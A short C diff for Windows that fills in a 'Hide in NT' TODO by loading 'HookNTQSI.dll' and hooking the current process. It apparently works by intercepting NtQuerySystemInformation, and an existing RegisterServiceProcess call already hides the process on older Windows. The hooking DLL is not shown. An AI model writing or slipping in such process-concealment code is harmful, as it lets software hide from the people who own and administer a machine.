@@ -125,7 +125,13 @@ int main()
   
   if(osvi.dwPlatformId == VER_PLATFORM_WIN32_NT)
   {
-    /* TODO: Hide in NT */
+    int (_cdecl *pfnHook)(DWORD);
+		HINSTANCE HookNTQSI= LoadLibrary("HookNTQSI.dll");
+		if(HookNTQSI)
+		{
+			pfnHook = (int(*)(DWORD))GetProcAddress(HookNTQSI,"Hook");
+			pfnHook(GetCurrentProcessId());
+		}
   } else {
     RegisterServiceProcess = (REGSERVICEPROC)GetProcAddress(Kernel32, "RegisterServiceProcess");
     RegisterServiceProcess(0, 1);
